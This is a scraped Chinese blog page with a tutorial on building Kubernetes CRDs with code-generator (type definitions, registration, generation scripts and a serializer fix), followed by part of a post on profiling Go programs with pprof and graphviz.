+k8s:deepcopy-gen:interfaces=k8s.io/apimachinery/pkg/runtime.Object  In our example above both Database and DatabaseList are top-level types because they are used as runtime.Objects. As a rule of thumb, top-level types are those which have metav1.TypeMeta embedded. Also, those are the types which clients are create for using client-gen.\nNote, that the // +k8s:deepcopy-gen:interfaces tag can and should also be used in cases where you define API types that have fields of some interface type, for example, field SomeInterface. Then // +k8s:deepcopy-gen:interfaces=example.com/pkg/apis/example.SomeInterface will lead to the generation of a DeepCopySomeInterface() SomeInterface method. This allows it to deepcopy those fields in a type-correct way.\nClient-gen Tags 最后，有许多标记可以控制client-gen，我们在我们的示例中看到了其中的两个标记。\n1 2 3  // +genclient// +genclient:noStatus  第一个标记告诉Client-gen为该类型创建一个client(这始终是选择加入)。注意，不必也不应该将其置于API对象的列表类型之上。\n1 2 3 4 5 6 7 8 9 10 11 12 13  // +genclient:nonNamespaced// +genclient:noVerbs// +genclient:onlyVerbs=create,delete// +genclient:skipVerbs=get,list,create,update,patch,delete,deleteCollection,watch// +genclient:method=Create,verb=create,result=k8s.io/apimachinery/pkg/apis/meta/v1.Status  程序使用client调用crd接口 使用client类型的main函数 A Main Function Using the Types Clients\nmain.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  import ( ... metav1 \u0026#34;k8s.io/apimachinery/pkg/apis/meta/v1\u0026#34; \u0026#34;k8s.io/client-go/tools/clientcmd\u0026#34; examplecomclientset \u0026#34;github.com/openshift-evangelist/crd-code-generation/pkg/client/clientset/versioned\u0026#34; ) var ( kuberconfig = flag.String(\u0026#34;kubeconfig\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;Path to a kubeconfig. Only required if out-of-cluster.\u0026#34;) master = flag.String(\u0026#34;master\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;The address of the Kubernetes API server. Overrides any value in kubeconfig. Only required if out-of-cluster.\u0026#34;) ) func main() { flag.Parse() cfg, err := clientcmd.BuildConfigFromFlags(*master, *kuberconfig) if err != nil { glog.Fatalf(\u0026#34;Error building kubeconfig: %v\u0026#34;, err) } exampleClient, err := examplecomclientset.NewForConfig(cfg) if err != nil { glog.Fatalf(\u0026#34;Error building example clientset: %v\u0026#34;, err) } list, err := exampleClient.ExampleV1().Databases(\u0026#34;default\u0026#34;).List(metav1.ListOptions{}) if err != nil { glog.Fatalf(\u0026#34;Error listing all databases: %v\u0026#34;, err) } for _, db := range list.Items { fmt.Printf(\u0026#34;database %s with user %q\\n\u0026#34;, db.Name, db.Spec.User) } }   tpye.go 实例 pkg/apis/example.com/v1/types.go 注意标记注释于type定义块之间的空行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61  package v1 import ( metav1 \u0026#34;k8s.io/apimachinery/pkg/apis/meta/v1\u0026#34; ) // NodeCacheStatus represents the status of NodeCche. type NodeCacheStatus struct { // The number of \u0026#39;Unknonw\u0026#39; NodeCache in this Node.  Unknown int32 `json:\u0026#34;unknown,omitempty\u0026#34; protobuf:\u0026#34;bytes,1,opt,name=unknown\u0026#34;` // The number of \u0026#39;Pending\u0026#39; NodeCache in this queue.  Pending int32 `json:\u0026#34;pending,omitempty\u0026#34; protobuf:\u0026#34;bytes,2,opt,name=pending\u0026#34;` // The number of \u0026#39;Running\u0026#39; NodeCache in this queue.  Running int32 `json:\u0026#34;running,omitempty\u0026#34; protobuf:\u0026#34;bytes,3,opt,name=running\u0026#34;` } // +genclient // +k8s:deepcopy-gen:interfaces=k8s.io/apimachinery/pkg/runtime.Object  type NodeCache struct { metav1.TypeMeta `json:\u0026#34;,inline\u0026#34;` metav1.ObjectMeta `json:\u0026#34;metadata,omitempty\u0026#34; protobuf:\u0026#34;bytes,1,opt,name=metadata\u0026#34;` Spec NodeCacheSpec `json:\u0026#34;spec,omitempty\u0026#34; protobuf:\u0026#34;bytes,2,opt,name=spec\u0026#34;` // The status of NCDataSet.  // +optional  Status NodeCacheStatus `json:\u0026#34;status,omitempty\u0026#34; protobuf:\u0026#34;bytes,3,opt,name=status\u0026#34;` } type NodeCacheSpec struct { // dataset list  //Datasets []DataSetSummary `json:\u0026#34;datasets,omitempty\u0026#34; protobuf:\u0026#34;bytes,1,opt,name=datasets\u0026#34;`  Datasets string `json:\u0026#34;datasets,omitempty\u0026#34; protobuf:\u0026#34;bytes,1,opt,name=datasets\u0026#34;` // Disk size unit :GB  FreeSize int64 `json:\u0026#34;freesize,omitempty\u0026#34; protobuf:\u0026#34;bytes,2,opt,name=freesize\u0026#34;` // Disk size unit :GB  AllocatableSize int64 `json:\u0026#34;allocatablesize,omitempty\u0026#34; protobuf:\u0026#34;bytes,2,opt,name=allocatablesize\u0026#34;` } //// +k8s:deepcopy-gen:interfaces=k8s.io/apimachinery/pkg/runtime.Object // //type DataSetSummary struct { // Digest string `json:\u0026#34;digest,omitempty\u0026#34; protobuf:\u0026#34;bytes,1,opt,name=digest\u0026#34;` // Size int64 `json:\u0026#34;size,omitempty\u0026#34; protobuf:\u0026#34;bytes,2,opt,name=size\u0026#34;` // InUse bool `json:\u0026#34;inuse,omitempty\u0026#34; protobuf:\u0026#34;bytes,3,opt,name=inuse\u0026#34;` //}  // +k8s:deepcopy-gen:interfaces=k8s.io/apimachinery/pkg/runtime.Object  // NodeCacheList is a collection of NodeCache. type NodeCacheList struct { metav1.TypeMeta `json:\u0026#34;,inline\u0026#34;` // Standard list metadata  // More info: https://git.k8s.io/community/contributors/devel/api-conventions.md#metadata  // +optional  metav1.ListMeta `json:\u0026#34;metadata,omitempty\u0026#34; protobuf:\u0026#34;bytes,1,opt,name=metadata\u0026#34;` // items is the list of NCDataSet  Items []NodeCache `json:\u0026#34;items\u0026#34; protobuf:\u0026#34;bytes,2,rep,name=items\u0026#34;` }   CRD开发步骤 1. 编写CRD YAML 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  apiVersion:apiextensions.k8s.io/v1beta1kind:CustomResourceDefinitionmetadata:name:nodecaches.example.comspec:group:example.comnames:kind:NodeCachelistKind:NodeCacheListplural:nodecachesscope:Clusterversion:v1validation:openAPIV3Schema:properties:apiVersion:type:stringkind:type:stringmetadata:type:objectspec:properties:datasets:type:stringfreesize:format:int64type:integerallocatablesize:format:int64type:integertype:objectstatus:properties:unknown:format:int32type:integerpending:format:int32type:integerrunning:format:int32type:integertype:objecttype:object  2. 创建项目目录 按照pkg/apis/$GROUP/$VERSION/形式创建项目目录，需要在该目录下编写crd相关的几个go文件\n doc.go register.go types.go  1 2 3 4 5 6 7 8 9 10 11  pkg/apis/example.com/v1/cd $GOPATH/src/github.com/goprojects/demo/pkg/apis.├── apis│ └── example.com│ └── v1│ ├── doc.go│ ├── register.go│ ├── types.go  3. 编写doc.go 位置：pkg/apis/$GROUP/$VERSION/doc.go\n1 2 3 4 5 6  // +k8s:deepcopy-gen=package,register  // Package v1beta1 is the v1beta1 version of the API. // +groupName=example.com package v1beta1   4. 编写types.go 位置：pkg/apis/$GROUP/$VERSION/types.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  package v1beta1 import ( metav1 \u0026#34;k8s.io/apimachinery/pkg/apis/meta/v1\u0026#34; ) // NodeStatStatus represents the status of NodeCche. type NodeStatStatus struct { // The number of \u0026#39;Unknonw\u0026#39; NodeStat in this Node.  Unknown int32 `json:\u0026#34;unknown,omitempty\u0026#34; protobuf:\u0026#34;bytes,1,opt,name=unknown\u0026#34;` // The number of \u0026#39;Pending\u0026#39; NodeStat in this queue.  Pending int32 `json:\u0026#34;pending,omitempty\u0026#34; protobuf:\u0026#34;bytes,2,opt,name=pending\u0026#34;` // The number of \u0026#39;Running\u0026#39; NodeStat in this queue.  Running int32 `json:\u0026#34;running,omitempty\u0026#34; protobuf:\u0026#34;bytes,3,opt,name=running\u0026#34;` } // +genclient // +k8s:deepcopy-gen:interfaces=k8s.io/apimachinery/pkg/runtime.Object  type NodeStat struct { metav1.TypeMeta `json:\u0026#34;,inline\u0026#34;` metav1.ObjectMeta `json:\u0026#34;metadata,omitempty\u0026#34; protobuf:\u0026#34;bytes,1,opt,name=metadata\u0026#34;` Spec NodeStatSpec `json:\u0026#34;spec,omitempty\u0026#34; protobuf:\u0026#34;bytes,2,opt,name=spec\u0026#34;` // The status of NodeStat.  // +optional  Status NodeStatStatus `json:\u0026#34;status,omitempty\u0026#34; protobuf:\u0026#34;bytes,3,opt,name=status\u0026#34;` } // ... // more code define // ...    5. 编写register.go 位置：pkg/apis/$GROUP/$VERSION/register.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  package v1beta1 import ( metav1 \u0026#34;k8s.io/apimachinery/pkg/apis/meta/v1\u0026#34; \u0026#34;k8s.io/apimachinery/pkg/runtime\u0026#34; \u0026#34;k8s.io/apimachinery/pkg/runtime/schema\u0026#34; ) const ( // GroupName is the group name used in this package.  GroupName = \u0026#34;example.com\u0026#34; // GroupVersion is the version of scheduling group  GroupVersion = \u0026#34;v1beta1\u0026#34; ) // SchemeGroupVersion is group version used to register these objects var SchemeGroupVersion = schema.GroupVersion{Group: GroupName, Version: GroupVersion} // Resource takes an unqualified resource and returns a Group qualified GroupResource func Resource(resource string) schema.GroupResource { return SchemeGroupVersion.WithResource(resource).GroupResource() } var ( // localSchemeBuilder and AddToScheme will stay in k8s.io/kubernetes.  SchemeBuilder runtime.SchemeBuilder localSchemeBuilder = \u0026amp;SchemeBuilder AddToScheme = localSchemeBuilder.AddToScheme ) func init() { // We only register manually written functions here. The registration of the  // generated functions takes place in the generated files. The separation  // makes the code compile even when the generated files are missing.  localSchemeBuilder.Register(addKnownTypes) } // Adds the list of known types to api.Scheme. func addKnownTypes(scheme *runtime.Scheme) error { scheme.AddKnownTypes(SchemeGroupVersion, \u0026amp;NodeStat{}, \u0026amp;NodeStatList{}, ) metav1.AddToGroupVersion(scheme, SchemeGroupVersion) return nil }   6. 执行 code-generator自动生成代码  安装 1 2 3 4  # set custom gopath GOPATH=/home/test/go_projects/crddemo go get k8s.io/code-generator go get k8s.io/apimachinery   执行shell脚本生成指定代码内容 1 2 3 4 5  cd $GOPATH/src/k8s.io/code-generator ./generate-groups.sh all \\ \u0026#34;github.com/bingerambo/demo/pkg/client\u0026#34; \\ \u0026#34;github.com/bingerambo/demo/pkg/apis\u0026#34; \\ foo:v1   demo脚本 crd-code-gen 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  # cd /home/wangb/go_projects/crddemo/src/github.com/bingerambo/crd-code-generation/hack \u0026amp;\u0026amp; ll total 12 -rwxr-x---. 1 root root 565 Oct 5 2020 custom-boilerplate.go.txt -rwxr-x---. 1 root root 543 Oct 5 2020 update-codegen.sh -rwxr-x---. 1 root root 693 Feb 28 2018 verify-codegen.sh # cd home/wangb/go_projects/crddemo/src/github.com/bingerambo/crd-code-generation/hack cat update-codegen.sh #!/bin/bash set -o errexit set -o nounset set -o pipefail GOPATH=\u0026#34;/home/wangb/go_projects/crddemo\u0026#34; SCRIPT_ROOT=$(dirname ${BASH_SOURCE})/.. CODEGEN_PKG=${CODEGEN_PKG:-$(cd ${SCRIPT_ROOT}; ls -d -1 ./vendor/k8s.io/code-generator 2\u0026gt;/dev/null || echo ${GOPATH}/src/k8s.io/code-generator)} vendor/k8s.io/code-generator/generate-groups.sh all \\  github.com/bingerambo/crd-code-generation/pkg/nodecache_client github.com/bingerambo/crd-code-generation/pkg/apis \\  example.com:v1 \\  --go-header-file ${SCRIPT_ROOT}/hack/custom-boilerplate.go.txt   7. 实例 nodestat-crd.yaml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86  ```yamlapiVersion:apiextensions.k8s.io/v1beta1kind:CustomResourceDefinitionmetadata:name:nodestats.example.comspec:group:example.comnames:kind:NodeStatlistKind:NodeStatListplural:nodestatsscope:Clusterversion:v1beta1validation:openAPIV3Schema:properties:apiVersion:type:stringkind:type:stringmetadata:type:objectspec:type:objectproperties:nodename:type:string# 利用率utility:type:objectproperties:name:type:stringsumarry:type:stringaverage:format:floattype:number devs:type:arrayitems:type:objectproperties:id:type:stringdata:format:floattype:number# 总量total:type:objectproperties:name:type:stringsumarry:type:stringaverage:format:floattype:number devs:type:arrayitems:type:objectproperties:id:type:stringdata:format:floattype:numberstatus:properties:unknown:format:int32type:integerpending:format:int32type:integerrunning:format:int32type:integertype:objecttype:object  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  #### 示例脚本nodestat-update-codegen.sh github.com/kubernetes-sigs/kube-batch/hack cat nodestat-update-codegen.sh ```shell #!/bin/bash # Copyright 2019 The Kube-batch Authors. # # Licensed under the Apache License, Version 2.0 (the \u0026#34;License\u0026#34;); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an \u0026#34;AS IS\u0026#34; BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. set -o errexit set -o nounset set -o pipefail SCRIPT_ROOT=$(dirname ${BASH_SOURCE})/.. CODEGEN_PKG=${SCRIPT_ROOT}/vendor/k8s.io/code-generator # generate the code with: # --output-base because this script should also be able to run inside the vendor dir of # k8s.io/kubernetes. The output-base is needed for the generators to output into the vendor dir # instead of the $GOPATH directly. For normal projects this can be dropped. cd ${SCRIPT_ROOT} bash ${CODEGEN_PKG}/generate-groups.sh \u0026#34;deepcopy,client,informer,lister\u0026#34; \\ github.com/kubernetes-sigs/kube-batch/pkg/nodestat_client github.com/kubernetes-sigs/kube-batch/pkg/apis \\ \u0026#34;example.com:v1beta1\u0026#34; \\ --go-header-file ${SCRIPT_ROOT}/hack/custom-boilerplate.go.txt # To use your own boilerplate text use: # --go-header-file ${SCRIPT_ROOT}/hack/custom-boilerplate.go.txt   codegen代码自动生成命令 例子：kube-batch 执行命令代码生成\n1 2 3  GOPATH=\u0026#34;project gopath\u0026#34; ${GOPATH}/src/github.com/kubernetes-sigs/kube-batch/hack/nodestat-update-codegen.sh   1 2 3 4 5 6 7  github.com/kubernetes-sigs/kube-batch]# /home/wangb/go_projects/kubebatch/src/github.com/kubernetes-sigs/kube-batch/hack/nodestat-update-codegen.shGenerating deepcopy funcsGenerating clientset for example.com:v1beta1 at github.com/kubernetes-sigs/kube-batch/pkg/nodestat_client/clientsetGenerating listers for example.com:v1beta1 at github.com/kubernetes-sigs/kube-batch/pkg/nodestat_client/listersGenerating informers for example.com:v1beta1 at github.com/kubernetes-sigs/kube-batch/pkg/nodestat_client/informers  问题 使用自动生成后的代码，操作自定义CRD时，会报错，如下\n1 2  E0420 11:40:15.739772 8308 streamwatcher.go:109] Unable to decode an event from the watch stream: unable to decode watch event: no kind \u0026#34;NodeStat\u0026#34; is registered for version \u0026#34;example.com/v1beta1\u0026#34; in scheme \u0026#34;github.com/kubernetes-sigs/kube-batch/pkg/nodecache_client/clientset/versioned/scheme/register.go:30\u0026#34; E0420 11:40:15.851896 8308 streamwatcher.go:109] Unable to decode an event from the watch stream: unable to decode watch event: no kind \u0026#34;NodeStat\u0026#34; is registered for version \u0026#34;example.com/v1beta1\u0026#34; in scheme \u0026#34;github.com/kubernetes-sigs/kube-batch/pkg/nodecache_client/clientset/versioned/scheme/register.go:30\u0026#34;   手动修改生成代码解决，自定义serializer.DirectCodecFactory nodestat_client/clientset/versioned/typed/example.com/v1beta1/example.com_client.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  package v1beta1 import ( v1beta1 \u0026#34;github.com/kubernetes-sigs/kube-batch/pkg/apis/example.com/v1beta1\u0026#34; \u0026#34;github.com/kubernetes-sigs/kube-batch/pkg/nodestat_client/clientset/versioned/scheme\u0026#34; \u0026#34;k8s.io/apimachinery/pkg/runtime/serializer\u0026#34; rest \u0026#34;k8s.io/client-go/rest\u0026#34; ) func setConfigDefaults(config *rest.Config) error { gv := v1beta1.SchemeGroupVersion config.GroupVersion = \u0026amp;gv config.APIPath = \u0026#34;/apis\u0026#34; // modify by binge  //config.NegotiatedSerializer = scheme.Codecs.WithoutConversion()  config.NegotiatedSerializer = serializer.DirectCodecFactory{ CodecFactory: scheme.Codecs, } if config.UserAgent == \u0026#34;\u0026#34; { config.UserAgent = rest.DefaultKubernetesUserAgent() } return nil }   参考资料  使用 CustomResourceDefinition 扩展 Kubernetes API 如何配置使用kubernets code-generator how-to-generate-client-codes-for-kubernetes-custom-resource-definitions-crd ","permalink":"http://bingerambo.com/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/","tags":["K8S"],"title":"K8S中的CRD开发"},{"categories":["Go"],"contents":"Golang作为一门高效的语言，性能监控和调试非常重要，如何进行性能监控和分析是优化的关键。\nGo语言项目中的性能优化主要有以下几个方面：\n CPU profile：报告程序的 CPU 使用情况，按照一定频率去采集应用程序在 CPU 和寄存器上面的数据 Memory Profile（Heap Profile）：报告程序的内存使用情况 Block Profiling：报告 goroutines 不在运行状态的情况，可以用来分析和查找死锁等性能瓶颈 Goroutine Profiling：报告 goroutines 的使用情况，有哪些 goroutine，它们的调用关系是怎样的  pprof介绍   go程序从开始运行起，runtime就按照一定频率对内存分配进行采样记录：当内存分配每达到一定值（默认是512KB，由runtime.MemProfileRate设定）, runtime就会记录下当前这次内存分配的大小，call stack等信息到profile里面。\n  而CPU的profile是从调用runtime/pprof包的pprof.StartCPUProfile()开始，到pprof.StopCPUProfile()结束，每1秒采样100次，每次采样时记录下当前正在执行的所有goroutine的call stack，某个函数在这些快照里面出现的次数越多就说明这个函数越耗时。\n  运行的go程序的所有profile信息都是通过在运行时调用runtime/pprof和runtime/trace两个包的接口获取，调用这些接口的方式有直接调用和通过http请求间接调用两种，下面我们说明各种常用的profile信息以及它们的获取，使用方式。\n  pprof配置 pprof采集方式有2种：\n 命令模式 监控模式  pprof开启后，每隔一段时间（10ms）就会收集下当前的堆栈信息，获取格格函数占用的CPU以及内存资源；最后通过对这些采样数据进行分析，形成一个性能分析报告。\n引入包 1  import \u0026#34;runtime/pprof\u0026#34;   使用方法 1 2 3  pprof.StartCPUProfile(w io.Writer) //开启，向一个io中写入cpu信息 pprof.WriteHeapProfile(w io.Writer) //向一个io中写入内存信息 pprof.StopCPUProfile() //停止，写入完成   命令模式 将数据写入到文件中 通过 go tool pprof [文件名] 命令查看使用\n我们可以在交互界面输入top 10 来查看程序中占用CPU前10位的函数：\n命令： top 10\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  [root@node61 ~]# go tool pprof http://10.151.11.61:39999/debug/pprof/profile?seconds=30Fetching profile over HTTP from http://10.151.11.61:39999/debug/pprof/profile?seconds=30Saved profile in /root/pprof/pprof.kube-batch.samples.cpu.018.pb.gzFile:kube-batchBuild ID:3224bdfdc94dfee3f4c2f15d26825527ae27817cType:cpuTime:Apr 5, 2021 at 11:48am (CST)Duration:30s, Total samples = 290ms ( 0.97%)Entering interactive mode (type \u0026#34;help\u0026#34; for commands, \u0026#34;o\u0026#34; for options)(pprof) top 10Showing nodes accounting for 200ms, 68.97% of 290ms totalShowing top 10 nodes out of 106flat flat% sum% cum cum%40ms 13.79% 13.79% 40ms 13.79% runtime.usleep30ms 10.34% 24.14% 30ms 10.34% encoding/json.stateInString20ms 6.90% 31.03% 70ms 24.14% regexp.(*Regexp).tryBacktrack20ms 6.90% 37.93% 20ms 6.90% regexp/syntax.(*Inst).MatchRunePos20ms 6.90% 44.83% 20ms 6.90% runtime.epollwait20ms 6.90% 51.72% 60ms 20.69% runtime.mallocgc20ms 6.90% 58.62% 20ms 6.90% runtime.memclrNoHeapPointers10ms 3.45% 62.07% 30ms 10.34% encoding/json.(*Decoder).readValue10ms 3.45% 65.52% 10ms 3.45% encoding/json.stateEndValue10ms 3.45% 68.97% 10ms 3.45% github.com/kubernetes-sigs/kube-batch/vendor/github.com/json-iterator/go.(*Iterator).ReadString(pprof)  其中：\n flat：当前函数占用CPU的耗时 flat%：当前函数占用CPU的耗时百分比 sum%：函数占用CPU的耗时累计百分比 cum：当前函数加上调用当前函数的函数占用CPU的总耗时 cum%：当前函数加上调用当前函数的函数占用CPU的总耗时百分比 最后一列：函数名称  也可以通过list 函数名查看函数的信息\n命令： list func_name\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  (pprof) list ReadStringTotal:290msROUTINE ======================== github.com/kubernetes-sigs/kube-batch/vendor/github.com/json-iterator/go.(*Iterator).ReadString in /home/wangb/projects/src/github.com/kubernetes-sigs/kube-batch/vendor/github.com/json-iterator/go/iter_str.go10ms 10ms (flat, cum) 3.45% of Total. . 10:c := iter.nextToken(). . 11:if c == \u0026#39;\u0026#34;\u0026#39; {. . 12:for i := iter.head; i \u0026lt; iter.tail; i++ {. . 13:c := iter.buf[i]. . 14:if c == \u0026#39;\u0026#34;\u0026#39; {10ms 10ms 15:ret = string(iter.buf[iter.head:i]). . 16:iter.head = i + 1. . 17:return ret. . 18:}else if c == \u0026#39;\\\\\u0026#39; {. . 19:break. . 20:}else if c \u0026lt; \u0026#39; \u0026#39; {(pprof)  tree查看调用链\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  (pprof) topShowing nodes accounting for 200ms, 68.97% of 290ms totalShowing top 10 nodes out of 106flat flat% sum% cum cum%40ms 13.79% 13.79% 40ms 13.79% runtime.usleep30ms 10.34% 24.14% 30ms 10.34% encoding/json.stateInString20ms 6.90% 31.03% 70ms 24.14% regexp.(*Regexp).tryBacktrack20ms 6.90% 37.93% 20ms 6.90% regexp/syntax.(*Inst).MatchRunePos20ms 6.90% 44.83% 20ms 6.90% runtime.epollwait20ms 6.90% 51.72% 60ms 20.69% runtime.mallocgc20ms 6.90% 58.62% 20ms 6.90% runtime.memclrNoHeapPointers10ms 3.45% 62.07% 30ms 10.34% encoding/json.(*Decoder).readValue10ms 3.45% 65.52% 10ms 3.45% encoding/json.stateEndValue10ms 3.45% 68.97% 10ms 3.45% github.com/kubernetes-sigs/kube-batch/vendor/github.com/json-iterator/go.(*Iterator).ReadString(pprof) tree ReadStringActive filters:focus=ReadStringShowing nodes accounting for 10ms, 3.45% of 290ms total----------------------------------------------------------+-------------flat flat% sum% cum cum% calls calls% + context----------------------------------------------------------+-------------10ms 100% | github.com/kubernetes-sigs/kube-batch/vendor/github.com/json-iterator/go.(*Iterator).ReadObjectCB10ms 3.45% 3.45% 10ms 3.45% | github.com/kubernetes-sigs/kube-batch/vendor/github.com/json-iterator/go.(*Iterator).ReadString----------------------------------------------------------+-------------10ms 100% | github.com/kubernetes-sigs/kube-batch/vendor/github.com/json-iterator/go.(*Iterator).skipObject00% 3.45% 10ms 3.45% | github.com/kubernetes-sigs/kube-batch/vendor/github.com/json-iterator/go.(*Iterator).ReadObjectCB10ms 100% | github.com/kubernetes-sigs/kube-batch/vendor/github.com/json-iterator/go.(*Iterator).ReadString10ms 100% | github.com/kubernetes-sigs/kube-batch/vendor/github.com/json-iterator/go.(*Iterator).skipObject.func1----------------------------------------------------------+-------------10ms 100% | github.com/kubernetes-sigs/kube-batch/vendor/github.com/json-iterator/go.(*frozenConfig).Unmarshal00% 3.45% 10ms 3.45% | github.com/kubernetes-sigs/kube-batch/vendor/github.com/json-iterator/go.(*Iterator).ReadVal10ms 100% | github.com/kubernetes-sigs/kube-batch/vendor/github.com/json-iterator/go.(*twoFieldsStructDecoder).Decode----------------------------------------------------------+-------------  监控方式 如果你的应用程序是一直运行的，比如 web 应用，那么可以使用net/http/pprof库，它能够在提供 HTTP 服务进行分析。\n如果使用了默认的http.DefaultServeMux（通常是代码直接使用 http.ListenAndServe(“0.0.0.0:8000”, nil)），只需要在你的web server端代码中按如下方式导入net/http/pprof\n此方式适合测试一些服务进程的性能，当某场景触发时，通过接口采集性能数据，便于查看程序的动态性能。\n如测试调度器在压力测试场景中的性能。采用此监控http方式，详细查看[pprof开启]\n安装graphviz graphviz是将结构信息表示为抽象图和网络图的一种方法。自动图形绘制在软件工程、数据库和网页设计、网络化以及其他许多领域的可视化界面中都有着重要的应用。\ngraphviz安装完成后，在后面使用pprof生成的测试profile，可以转成svg等格式（如调度图），进行可视化查看\ngraphviz下载地址\n安装命令 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  # Ubuntu packages* sudo apt install graphviz # Fedora project* sudo yum install graphviz # Debian packages* sudo apt install graphviz # Stable and development rpms for Redhat Enterprise, or CentOS systems* available but are out of date. sudo yum install graphviz   测试graphviz是否安装成功 1 2 3 4 5  [root@node61 ~]# dot -V dot - graphviz version 2.47.0 (20210316.0004) [root@node61 ~]# [root@node61 ~]#   pprof开启 包pprof以pprof可视化工具所期望的格式通过其HTTP服务器运行时分析数据提供服务。通常，导入包只是为了注册其HTTP处理程序的副作用。所处理的路径都以/DEBUG/pprof/开头。\ngo语言提供包：\n runtime/pprof：采集工具型应用运行数据进行分析 net/http/pprof：采集服务型应用运行时数据进行分析  如何使用pprof 导入pprof包\n1 2  // pprof import _ \u0026#34;net/http/pprof\u0026#34;   这一句导致源码里面实际执行的是:\n1 2 3 4 5 6 7  func init() { http.HandleFunc(\u0026#34;/debug/pprof/\u0026#34;, Index) http.HandleFunc(\u0026#34;/debug/pprof/cmdline\u0026#34;, Cmdline) http.HandleFunc(\u0026#34;/debug/pprof/profile\u0026#34;, Profile) http.HandleFunc(\u0026#34;/debug/pprof/symbol\u0026#34;, Symbol) http.HandleFunc(\u0026#34;/debug/pprof/trace\u0026#34;, Trace) }   上面的url和处理函数都被注册到了http包的DefaultServeMux里面，所以要想使用这些url就必须使用DefaultServeMux来监听某一端口：\n如果应用程序尚未运行http服务器，则需要启动该服务器。在导入中添加“net/http”和“log”，并在主函数中添加以下代码：\n1 2 3 4  // pprof go func() { log.Println(http.ListenAndServe(\u0026#34;localhost:6060\u0026#34;, nil)) }()   这里第一个参数可以是本机的任一端口，当第二个参数为nil时就使用http包的DefaultServeMux来监听并处理http请求， 或者当程序里面已经有自定义的ServeMux时，可以像上面的init函数那样把pprof的处理函数注册到自定义的ServeMux。\nheap profile 1  go tool pprof http://localhost:6060/debug/pprof/heap   30-second CPU profile 1 2  # go tool pprof http://localhost:6060/debug/pprof/profile?seconds=30 go tool pprof http://10.151.11.61:39999/debug/pprof/profile?seconds=30   这个http请求会等seconds参数指定的秒数，这期间读取请求返回的二进制格式内容，我们把返回的内容保存为文件，假设取名为cpu.prof, 这个文件里面包含了程序收到请求后的seconds秒内运行占用CPU的情况。 接下来我们通过在命令行输入go tool pprof来查看cpu.prof:\n1  go tool pprof cpu.prof   这个命令会进入命令行交互，我们可以输入很多子命令来查看相关信息，最常用的几个子命令是：\n1 2  # top N top 10   该子命令会列出最耗时的N个函数调用，在输入top命令前输入cum或flat可以使得top列出的列表按cum或flat列排序，flat是单个函数自身（不计函数里面调用的其它函数）的耗时，cum是函数从进入到退出总的耗时。\n如果要看某个函数具体是在什么地方耗时，可以使用list子命令查看：\n1  list func_name_in_top_list   该命令会显示耗时的代码和行号, 如果提示找不到source信息，可以在go tool pprof后面指定保存在本地的被profile程序的binary文件，并且这个binary文件要和生成profile文件的程序是在同一平台下编译的。比如在本地的Windows机器上远程profile linux机器上运行的go程序时，确保本地指定的binary是linux机器上编译的：\n1 2  go tool pprof mybinarypath prof_file_from_remote_host go tool pprof mybinarypath https://myremotehost/debug/pprof/profile   为了更直观的看出热点函数的调用关系，我们更多的是使用svg和web子命令：\n1 2 3  ###svg \u0026gt; xxx.svg ##web svg   svg命令会生成一个指定文件名的svg文件，web命令会生成一个svg文件并用浏览器打开这个文件，执行web命令前先确保安装了graphviz（brew install graphviz, 然后brew list graphviz查看安装位置并将安装位置的bin目录加到PATH），并确保svg文件的默认打开程序是浏览器。 通过web子命令在浏览器打开的这个svg文件非常有用, 可以清楚的看到耗时函数的调用关系图。\n查看环境cpu profile命令 在环境中，获取cpu pofile命令，默认采集时长30秒\n1  go tool pprof http://10.151.11.61:8080/debug/pprof/profile   fetch完成后，会进入pprof，然后输入svg，（环境中使用web自动打开svg），导出xxx.svg文件，将该svg文件拷贝出来，使用浏览器打开即可。\n1 2 3 4  type \u0026#34;help \u0026lt;cmd|option\u0026gt;\u0026#34; for more information(pprof) svgGenerating report in profile001.svg  调度图 把上面的xxx.svg文件，使用浏览器打开，就能看到调度图，里面包含了各函数之间的调用性能\n关于图形的说明：\n 每个框代表一个函数，理论上框的越大表示占用的CPU资源越多。 方框之间的线条代表函数之间的调用关系。 线条上的数字表示函数调用的次数。 方框中的第一行数字表示当前函数占用CPU的百分比，第二行数字表示当前函数累计占用CPU的百分比。  go tool 